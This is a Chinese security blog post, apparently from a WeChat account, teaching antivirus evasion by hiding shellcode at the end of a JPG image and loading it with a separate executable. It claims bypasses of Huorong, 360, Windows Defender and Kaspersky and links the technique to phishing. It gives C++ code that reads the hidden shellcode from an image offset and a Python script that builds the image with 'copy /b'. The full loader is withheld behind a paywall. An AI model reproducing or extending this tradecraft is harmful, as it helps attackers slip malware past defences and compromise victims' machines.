> **原文链接**: https://mp.weixin.qq.com/s?__biz=MzkxNjY1MjY3OQ==&mid=2247488461&idx=1&sn=b88287aca61333f93fdcff10e3b8f467

#  【免杀】loader和shellcode分离-图片注入shellcode  
原创 CatalyzeSec  CatalyzeSec   2025-06-19 11:16  
  
![](https://mmbiz.qpic.cn/mmbiz_png/N2vfpRNU8pAITZd4qAicYWBGcjeG2hbn2cXouRp6Ss1Js0yXYyHhhCFL1SOLNMyftpLUSicVlKmdte5B0WrVfzCg/640 "")  
  
前言  
  
此前也出过一些简单的免杀和包装免杀进行钓鱼的技巧，有兴趣的朋友可以翻翻公众号以前的文章，其中关于免杀这部分技术思路被评价是不够透彻（8窍通了7窍），这段时间痛定思痛沉淀了一番，话不多说先看效果，基本原理和成果代码也贴在后头，付费则是为了保护成果  
和赚包烟钱  
，本篇包括后续的付费文章也会在星球同步更新，星球成员可以直接观看。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/N2vfpRNU8pAITZd4qAicYWBGcjeG2hbn2cXouRp6Ss1Js0yXYyHhhCFL1SOLNMyftpLUSicVlKmdte5B0WrVfzCg/640 "")  
  
免杀效果  
  
经过测试可以过火绒  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/EqMwaEZz0ykb5q4te9icSAZlTvCCOxpOgtZjicUoZeYTMcNGUYUSz2N5HSc7ib9RR0icoqnicgukw6viaq9FJL5JZIVQ/640?wx_fmt=png&from=appmsg "")  
  
添加签名后可以过36  
0  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/EqMwaEZz0ykb5q4te9icSAZlTvCCOxpOgSVOvg3sOZxqoQypkp5sPvT6z48146ATeX64ia7zjib1dgRO8llpDTOJg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/EqMwaEZz0ykb5q4te9icSAZlTvCCOxpOgib4tLbOow9ATEjRnqo92QrZrWyRzVTtUpsDGjD4lZibG6jVEiaCJbVv0A/640?wx_fmt=png&from=appmsg "")  
  
过windows defender  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/EqMwaEZz0ykb5q4te9icSAZlTvCCOxpOgP2CdMIXh21EqEibVwoDf62Nfs7jYvczl45y0tuPhnL2z7ozD3aAWib0g/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/EqMwaEZz0ykb5q4te9icSAZlTvCCOxpOgAE8ictzhgnZaNTeDib3nxOJE5OtbHC97ePTa4zm6Ps7ssqV6Ge7rvs0A/640?wx_fmt=png&from=appmsg "")  
  
过卡巴斯基  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/EqMwaEZz0ykb5q4te9icSAZlTvCCOxpOgzosZKwgQxutxnKztPbrmCgtEP4GdibgUhxXGXmwj8gyXX3SvKibcfAicw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/EqMwaEZz0ykb5q4te9icSAZlTvCCOxpOg9LXSYcoXmltxT1UWFjYdfHm2pA2S0bdKlCmlGBD7UcLzFkren3Ic9A/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/N2vfpRNU8pAITZd4qAicYWBGcjeG2hbn2cXouRp6Ss1Js0yXYyHhhCFL1SOLNMyftpLUSicVlKmdte5B0WrVfzCg/640 "")  
  
基本原理  
  
shellcode和loader分离的模式基本上是可以绕过大部分静态检测的机制，但是一个exe文件和一个二进制文件在一起的话会显得非常的突兀。  
  
这里通过将shellcode添加到图片文件中，让loader读取指定偏移后的shellcode就可以达到读取图片文件上线的效果。  
  
读取图片文件中的shellcode代码：  

```
char filename[] = &#34;xxx.jpg&#34;; // filename
int offset = 10086; // image file offset


ifstream infile;
infile.open(filename, ios::out | ios::binary);
infile.seekg(0, infile.end);
int length = infile.tellg();
infile.seekg(offset, infile.beg);


int shellcode_size = length - offset;
char* data = new char[shellcode_size];
infile.read(data, length);
```

  
下面的python代码实现获取读取图片文件的字节数来得到offset偏移量，同时实现cmd的copy拼接功能（图片文件和shellcode文件要和python文件在同一个文件夹下）  

```
# usage: python countByte.py file1 file2
# 获取file1的字节数
# 实现功能 -> copy file1 /b + file2 /b out_res.jpg
import os
import sys


def get_file_size(file_path):
    try:
        # 获取文件大小（字节数）
        size = os.path.getsize(file_path)
        print(f&#34;文件 '{file_path}' 的大小为 {size} 字节&#34;)
        return size
    except:
        pass


if __name__ == &#34;__main__&#34;:
    if len(sys.argv) < 3:
        print(&#34;用法：python script.py <文件路径1> <文件路径1>&#34;)
    else:
        file_path = sys.argv[1]
        file_path2 = sys.argv[2]
        get_file_size(file_path)


        os.system(&#34;copy &#34;+ file_path +&#34; /b + &#34; + file_path2 + &#34; /b out_res.jpg&#34;)
```

  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_jpg/EqMwaEZz0ykb5q4te9icSAZlTvCCOxpOgYUUughwBO1R6R5yMgJF9pTuvSpkAEqn6hA6DDWgIhE5icOzdcXPfUzg/640?wx_fmt=other&from=appmsg "")  
  
因为图片文件没有受到损坏，shellcode是添加在图片最后，图片文件仍然可以打开  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/EqMwaEZz0ykb5q4te9icSAZlTvCCOxpOgHxQR8tP9rgxSiahmpCWYSwdjC4ajqiaicuYZg6PjVTviaEEwxib9BsJWlfw/640?wx_fmt=png&from=appmsg "")  
  
图片文件和loader在同一个文件夹下，双击exe即可上线  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_jpg/EqMwaEZz0ykb5q4te9icSAZlTvCCOxpOgSibictmPCfGQSPOIpia3m7vfkX7UHMxJVeKr7IiclC9GNia93JzmnH6IFyQ/640?wx_fmt=other&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/N2vfpRNU8pAITZd4qAicYWBGcjeG2hbn2cXouRp6Ss1Js0yXYyHhhCFL1SOLNMyftpLUSicVlKmdte5B0WrVfzCg/640 "")  
  
完整loader代码及操作流程  
  
